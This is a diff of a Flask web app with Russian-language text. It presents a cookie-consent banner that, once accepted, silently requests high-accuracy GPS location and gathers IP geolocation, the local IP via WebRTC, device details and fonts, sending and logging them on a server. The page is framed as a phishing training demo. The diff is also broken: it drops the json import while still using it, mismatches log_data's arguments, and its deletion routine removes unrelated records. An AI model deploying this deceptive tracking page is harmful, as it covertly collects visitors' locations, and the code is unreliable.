@@ -2,14 +2,13 @@ from flask import Flask, request, render_template_string
 import requests
 from datetime import datetime
 import re
-import json
 import os
 
 app = Flask(__name__)
 
-# Конфигурация
-COOKIE_NAME = "data_consent"
-LOG_FILE = "user_data.json"
+# Настройки
+LOG_FILE = "user_data.log"
+COOKIE_NAME = "user_consent"
 
 def get_ip_data(ip):
     try:
@@ -54,11 +53,32 @@ def parse_user_agent(user_agent):
     return os, browser, device
 
 def log_data(ip, data):
-    try:
-        with open(LOG_FILE, "a") as f:
-            f.write(json.dumps(data) + "\n")
-    except Exception as e:
-        print(f"Ошибка записи в лог: {e}")
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(json.dumps(data, ensure_ascii=False) + "\n")
+
+def delete_user_data(ip):
+    if not os.path.exists(LOG_FILE):
+        return False
+
+    with open(LOG_FILE, "r", encoding="utf-8") as f:
+        lines = f.readlines()
+
+    new_lines = []
+    skip = False
+    for line in lines:
+        try:
+            data = json.loads(line)
+            if data.get("ip") == ip:
+                skip = True
+            if not skip:
+                new_lines.append(line)
+        except:
+            continue
+
+    with open(LOG_FILE, "w", encoding="utf-8") as f:
+        f.writelines(new_lines)
+
+    return True
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -66,12 +86,12 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Техническая информация</title>
+    <title>Анализ устройства</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
             background-color: #111;
             color: #00FF88;
+            font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
         }
@@ -90,6 +110,7 @@ HTML_TEMPLATE = """
         }
         h1, h2 {
             color: #00FF88;
+            text-align: center;
         }
         #cookieConsent {
             position: fixed;
@@ -103,33 +124,16 @@ HTML_TEMPLATE = """
             z-index: 1000;
         }
         .consent-btn {
-            background: #00AA00;
+            background: #4CAF50;
             color: white;
             border: none;
-            padding: 8px 16px;
-            margin: 0 5px;
-            border-radius: 4px;
+            padding: 10px 20px;
+            margin: 0 10px;
+            border-radius: 5px;
             cursor: pointer;
         }
         .consent-btn.deny {
-            background: #AA0000;
-        }
-        #loadingModal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.8);
-            z-index: 1001;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 24px;
-        }
-        #mainContent {
-            display: none;
+            background: #f44336;
         }
         #map {
             height: 300px;
@@ -141,14 +145,14 @@ HTML_TEMPLATE = """
             color: #FF5555;
             margin-top: 20px;
             padding: 15px;
-            background: rgba(255,0,0,0.1);
+            background: rgba(255, 0, 0, 0.1);
             border-radius: 8px;
         }
     </style>
 </head>
 <body>
     <!-- Основной контент -->
-    <div id="mainContent" class="container">
+    <div id="mainContent" class="container" style="display: none;">
         <h1>🔍 Полная информация об устройстве</h1>
         
         <div class="info-block">
@@ -157,7 +161,7 @@ HTML_TEMPLATE = """
             <p><strong>Страна:</strong> {{ country }}</p>
             <p><strong>Город:</strong> {{ city }}</p>
             <p><strong>Провайдер:</strong> {{ isp }}</p>
-            <div id="gpsInfo" style="display: none;">
+            <div id="gpsData" style="display: none;">
                 <p><strong>Координаты:</strong> <span id="coordinates"></span></p>
                 <p><strong>Точность:</strong> <span id="accuracy"></span></p>
                 <div id="map"></div>
@@ -174,28 +178,24 @@ HTML_TEMPLATE = """
         </div>
 
         <div class="info-block">
-            <h2>📊 Дополнительные данные</h2>
+            <h2>🔌 Сетевые данные</h2>
             <p><strong>Локальный IP:</strong> <span id="localIp"></span></p>
             <p><strong>Доступные шрифты:</strong> <span id="fonts"></span></p>
         </div>
 
         <div class="warning">
             <h2>⚠️ Внимание!</h2>
-            <p>Вы стали жертвой учебной фишинговой атаки. Соглашаясь на "cookies", вы фактически разрешили доступ к вашей геолокации.</p>
+            <p>Вы только что стали жертвой учебной фишинговой атаки. Соглашаясь на "cookies", вы фактически разрешили доступ к вашей геолокации.</p>
+            <p><strong>Урок безопасности:</strong> Всегда внимательно читайте, на что вы даёте разрешение!</p>
             <button onclick="deleteMyData()" style="background: #FF5555; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">Удалить мои данные</button>
         </div>
     </div>
 
     <!-- Cookie-баннер -->
     <div id="cookieConsent">
-        <p>Этот сайт использует cookies для улучшения работы. Продолжая, вы соглашаетесь с их использованием.</p>
+        <p>Мы используем cookies для улучшения работы сервиса. Продолжая, вы соглашаетесь с их использованием.</p>
         <button class="consent-btn" onclick="acceptCookies()">Принять</button>
         <button class="consent-btn deny" onclick="rejectCookies()">Отклонить</button>
-    </div>
-
-    <!-- Модальное окно загрузки -->
-    <div id="loadingModal">
-        <div>Загрузка персонализированного контента...</div>
     </div>
 
     <script>
@@ -204,7 +204,7 @@ HTML_TEMPLATE = """
             return document.cookie.includes("{{ COOKIE_NAME }}=true");
         }
 
-        // Если согласие есть, загружаем данные
+        // Если согласие уже дано, загружаем данные
         if (checkConsent()) {
             document.getElementById('cookieConsent').style.display = 'none';
             loadUserData();
@@ -214,12 +214,9 @@ HTML_TEMPLATE = """
             // Устанавливаем куки
             document.cookie = "{{ COOKIE_NAME }}=true; max-age=31536000; path=/";
             document.getElementById('cookieConsent').style.display = 'none';
-            document.getElementById('loadingModal').style.display = 'flex';
             
-            // Запрашиваем геолокацию через 1.5 секунды (имитация загрузки)
-            setTimeout(() => {
-                getGeolocation();
-            }, 1500);
+            // Запрашиваем геолокацию
+            getGeolocation();
         }
 
         function rejectCookies() {
@@ -234,7 +231,7 @@ HTML_TEMPLATE = """
             document.getElementById('cpuCores').textContent = navigator.hardwareConcurrency || "Неизвестно";
             document.getElementById('screenRes').textContent = window.screen.width + "x" + window.screen.height;
             
-            // Получаем локальный IP через WebRTC
+            // Получаем локальный IP
             getLocalIP();
             
             // Получаем список шрифтов
@@ -253,7 +250,7 @@ HTML_TEMPLATE = """
                         document.getElementById('coordinates').textContent = lat.toFixed(6) + ", " + lon.toFixed(6);
                         document.getElementById('accuracy').textContent = "±" + Math.round(acc) + " метров";
                         showMap(lat, lon);
-                        document.getElementById('gpsInfo').style.display = 'block';
+                        document.getElementById('gpsData').style.display = 'block';
                         
                         // Отправляем на сервер
                         fetch('/log_gps', {
@@ -266,20 +263,17 @@ HTML_TEMPLATE = """
                             })
                         });
                         
-                        // Скрываем загрузку и показываем контент
-                        document.getElementById('loadingModal').style.display = 'none';
+                        // Показываем основной контент
                         loadUserData();
                     },
                     error => {
                         // В случае ошибки все равно показываем контент
-                        document.getElementById('loadingModal').style.display = 'none';
                         loadUserData();
                     },
                     {enableHighAccuracy: true}
                 );
             } else {
                 // Геолокация не поддерживается
-                document.getElementById('loadingModal').style.display = 'none';
                 loadUserData();
             }
         }
@@ -352,18 +346,14 @@ def index():
     os, browser, device = parse_user_agent(user_agent)
     
     # Логируем базовую информацию
-    log_data(ip, {
+    log_data({
         "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "ip": ip,
         "user_agent": user_agent,
         "os": os,
         "browser": browser,
         "device": device,
-        "geo": {
-            "country": geo.get('country'),
-            "city": geo.get('city'),
-            "isp": geo.get('org')
-        }
+        "geo": geo
     })
     
     return render_template_string(HTML_TEMPLATE,
@@ -382,8 +372,9 @@ def log_gps():
     data = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    log_data(ip, {
+    log_data({
         "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "ip": ip,
         "gps_data": data
     })
     
@@ -392,22 +383,8 @@ def log_gps():
 @app.route('/delete_data', methods=['POST'])
 def delete_data():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    try:
-        if os.path.exists(LOG_FILE):
-            with open(LOG_FILE, "r") as f:
-                logs = [json.loads(line) for line in f.readlines() if line.strip()]
-            
-            new_logs = [log for log in logs if log.get('ip') != ip]
-            
-            with open(LOG_FILE, "w") as f:
-                for log in new_logs:
-                    f.write(json.dumps(log) + "\n")
-            
-            return {'success': len(logs) != len(new_logs)}
-    except Exception as e:
-        print(f"Ошибка удаления данных: {e}")
-    
-    return {'success': False}
+    success = delete_user_data(ip)
+    return {'success': success}
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
